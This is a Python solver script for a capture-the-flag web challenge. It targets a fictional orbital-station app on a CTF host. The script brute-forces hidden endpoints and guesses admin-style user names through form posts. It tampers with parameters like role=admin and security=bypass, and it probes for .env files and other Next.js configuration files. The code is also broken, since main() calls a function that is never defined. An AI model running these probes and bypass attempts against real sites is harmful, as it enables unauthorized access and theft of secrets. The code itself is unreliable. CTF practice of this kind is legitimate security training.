#!/usr/bin/env python3
"""
Starship Infiltration Challenge Solver
Override defenses and disable vital systems at Astra-9 Orbital Station

Progress Update:
- Found access logs at /access-logs showing crew members with granted access
- Valid names: Astar, Nova, Vega, Lyra, Nebula (all have Docking Bay access)
- One redacted name (14 asterisks) has Bridge access with "Sufficient clearance"
- Authentication attempts with valid names still show currentCrewData: $undefined
- Need to find the correct redacted crew name or authentication method
"""

import requests
import re
import json
import time

def solve_starship_infiltration():
    print("🚀 Starship Infiltration Challenge Solver")
    print("=" * 60)
    
    base_url = "https://cpp.bootupctf.net:8086"
    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36'
    })
    
    print(f"🔍 Analyzing Astra-9 Orbital Station...")
    print(f"Target: {base_url}/docking-bay")
    
    # Get the main docking bay page
    response = session.get(f"{base_url}/docking-bay")
    print(f"Status: {response.status_code}")
    
    # Extract any useful information from the HTML
    html = response.text
    
    # Look for API endpoints, form actions, or JavaScript functionality
    print(f"\n📋 Extracting application details...")
    
    # Check for Next.js API routes or endpoints
    api_patterns = [
        r'/_next/static/chunks/[^"]+',
        r'/api/[^"]+',
        r'href="([^"]+)"',
        r'action="([^"]+)"',
        r'fetch\(["\']([^"\']+)["\']',
    ]
    
    endpoints = set()
    for pattern in api_patterns:
        matches = re.findall(pattern, html)
        endpoints.update(matches)
    
    # Filter for interesting endpoints
    interesting_endpoints = [ep for ep in endpoints if not ep.startswith('/_next/static')]
    
    if interesting_endpoints:
        print(f"Found endpoints: {interesting_endpoints[:10]}")
    
    # Test common API endpoints for space/sci-fi applications
    test_endpoints = [
        "/api/auth",
        "/api/crew",
        "/api/systems", 
        "/api/defenses",
        "/api/status",
        "/api/override",
        "/api/admin",
        "/api/security",
        "/crew",
        "/systems",
        "/defenses", 
        "/override",
        "/admin",
        "/security",
        "/control",
        "/bridge",
        "/engineering",
        "/navigation",
        "/weapons",
        "/shields",
        "/core",
        "/mainframe",
        "/command"
    ]
    
    print(f"\n🔍 Testing for hidden endpoints...")
    found_endpoints = []
    
    for endpoint in test_endpoints:
        try:
            test_response = session.get(f"{base_url}{endpoint}", timeout=5)
            if test_response.status_code in [200, 401, 403]:
                print(f"  ✅ {endpoint} - Status: {test_response.status_code}")
                found_endpoints.append((endpoint, test_response.status_code))
                
                # Check for flags in response
                if check_for_flag(test_response.text):
                    return f"Flag found at {endpoint}"
                    
        except requests.exceptions.RequestException:
            continue
    
    # Test the crew authorization functionality
    print(f"\n👥 Testing crew authorization...")
    
    # Try different crew names
    crew_names = [
        "admin",
        "administrator", 
        "captain",
        "commander",
        "security",
        "engineer",
        "override",
        "system",
        "root",
        "guest",
        "crew",
        "operative",
        "agent",
        "emergency",
        "maintenance"
    ]
    
    for name in crew_names:
        print(f"  Testing crew name: {name}")
        
        # Try to submit the form (might need to find the right endpoint)
        form_data = {
            'crew-name': name,
            'name': name,
            'crewName': name,
            'username': name
        }
        
        # Test different endpoints with the crew data
        for endpoint in ["/docking-bay", "/api/crew", "/crew", "/authorize"]:
            try:
                post_response = session.post(f"{base_url}{endpoint}", data=form_data, timeout=5)
                if post_response.status_code != 404:
                    print(f"    POST {endpoint}: {post_response.status_code}")
                    
                    if check_for_flag(post_response.text):
                        return f"Flag found with crew name '{name}' at {endpoint}"
                        
                    # Look for success indicators
                    if any(keyword in post_response.text.lower() for keyword in 
                           ["access granted", "authorized", "welcome", "success", "clearance"]):
                        print(f"    🎯 Potential access with '{name}': {post_response.text[:200]}...")
                        
            except requests.exceptions.RequestException:
                continue
    
    # Test for parameter manipulation
    print(f"\n🔧 Testing parameter manipulation...")
    
    # Try different authorization parameters
    auth_params = [
        {"auth": "admin"},
        {"role": "admin"},
        {"level": "admin"},
        {"clearance": "high"},
        {"access": "override"},
        {"security": "bypass"},
        {"emergency": "true"},
        {"override": "true"},
        {"admin": "true"}
    ]
    
    for params in auth_params:
        try:
            param_response = session.get(f"{base_url}/docking-bay", params=params, timeout=5)
            if param_response.text != response.text:  # Different from original
                print(f"  🎯 Parameter {params} changed response!")
                print(f"    Response preview: {param_response.text[:200]}...")
                
                if check_for_flag(param_response.text):
                    return f"Flag found with parameters {params}"
                    
        except requests.exceptions.RequestException:
            continue
    
    return None

def check_for_flag(response_text):
    """Check if response contains a flag"""
    flag_patterns = [
        r'[a-zA-Z0-9_]+\{[^}]+\}',
        r'flag\{[^}]+\}',
        r'bootup\{[^}]+\}',
        r'mne\{[^}]+\}',
        r'astra\{[^}]+\}',
    ]
    
    for pattern in flag_patterns:
        matches = re.findall(pattern, response_text, re.IGNORECASE)
        if matches:
            print(f"🚩 FLAG FOUND: {matches[0]}")
            return matches[0]
    
    return None

def explore_next_js_internals():
    """Look for Next.js specific vulnerabilities"""
    print(f"\n⚛️  Exploring Next.js application internals...")
    
    base_url = "https://cpp.bootupctf.net:8086"
    session = requests.Session()
    
    # Common Next.js endpoints to check
    nextjs_endpoints = [
        "/_next/server-stats",
        "/api/hello",
        "/api/auth/[...nextauth]",
        "/.env",
        "/.env.local", 
        "/next.config.js",
        "/package.json"
    ]
    
    for endpoint in nextjs_endpoints:
        try:
            response = session.get(f"{base_url}{endpoint}", timeout=5)
            if response.status_code == 200:
                print(f"  ✅ {endpoint}: {response.text[:100]}...")
                
                if check_for_flag(response.text):
                    return f"Flag found in {endpoint}"
                    
        except:
            continue
    
    return None

def main():
    # Main analysis
    result = analyze_starship_application()
    
    if result:
        print(f"\n🎉 Challenge Solved!")
        print(f"Result: {result}")
        return
    
    # Next.js specific checks
    nextjs_result = explore_next_js_internals()
    
    if nextjs_result:
        print(f"\n🎉 Challenge Solved!")
        print(f"Result: {nextjs_result}")
        return
    
    print(f"\n🤔 No obvious vulnerabilities found. Manual investigation required.")
    print(f"💡 Suggestions:")
    print(f"   1. Try different crew names or authentication bypasses")
    print(f"   2. Look for client-side JavaScript vulnerabilities")
    print(f"   3. Check for hidden form fields or API endpoints")
    print(f"   4. Test for authorization bypasses")

if __name__ == "__main__":
    main()
